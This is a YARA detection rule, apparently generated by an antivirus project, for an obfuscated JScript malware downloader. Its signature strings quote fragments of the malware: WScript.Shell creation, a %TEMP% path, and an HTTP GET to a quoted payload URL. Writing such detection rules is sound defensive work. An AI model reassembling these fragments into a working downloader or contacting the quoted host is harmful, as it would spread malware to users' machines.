rule sig_20160427_eedb7aa298320e9823b03f648ab3ea4c {
  meta:
    description = "datamaliciousorder - file 20160427_eedb7aa298320e9823b03f648ab3ea4c.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "695d757dc0e57e99b08e2f0872a24799e9e8144175c1abf92bbd13bf6765414b"

  strings:
    $s1  = "function JieqzJyjjh() {return RkagwBxvto[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"CfQl6ne" ascii
    $s2  = "function JieqzJyjjh() {return RkagwBxvto[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"CfQl6ne" ascii
    $s3  = "function RqoajLensi(FghicYekpg, LbjmzSyaku){ThlihThncj = ThlihThncj * 1; return FghicYekpg - LbjmzSyaku;};" fullword ascii
    $s4  = "var RkagwBxvto = function TefdhEsuda() {return FeaiuPnzan[IahctAgewo](\"WScript\"+\".Shell\");}(), ZvyyrXhsid = 11;" fullword ascii
    $s5  = "UlixfKjjfq[FdlaqVnvye](\"G\" + \"ET\", \"http://jurang.tk/n2ysk\", false);" fullword ascii
    $s6  = "var FeaiuPnzan = this[\"WScript\"];" fullword ascii
    $s7  = "function ScixgPreeo() {return ((ObnhxPhbru == true) && (ObnhxPhbru == CotgfAmqtt)) ? 1 : ThlihThncj;};" fullword ascii
    $s8  = "if (UlixfKjjfq[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s9  = "function NuwwhRbiko(){return WqohqWnbpk + \"\";};" fullword ascii
    $s10 = "var CotgfAmqtt = false;" fullword ascii
    $s11 = "function WhpiwRdmuw(GptzvGibvw) {var OadgfLpqzs = (1, 2, 3, 4, 5, GptzvGibvw); return OadgfLpqzs;};" fullword ascii
    $s12 = "ObnhxPhbru = true; " fullword ascii
    $s13 = "var VhmomGcmxo = new this[\"D\"+\"ate\"]();" fullword ascii
    $s14 = "function BcntoPntgp(){return 23;};" fullword ascii
    $s15 = "}while (OemowBxbxd);" fullword ascii
    $s16 = "return RqoajLensi(DcgayCmyqg, XqiycNjylv);" fullword ascii
    $s17 = "var ObnhxPhbru = false;" fullword ascii
    $s18 = "function HsudnSvyod(){return IahctAgewo;};" fullword ascii
    $s19 = "OrwqcXidbj = true;" fullword ascii
    $s20 = "function GpfwnYqjoi()" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}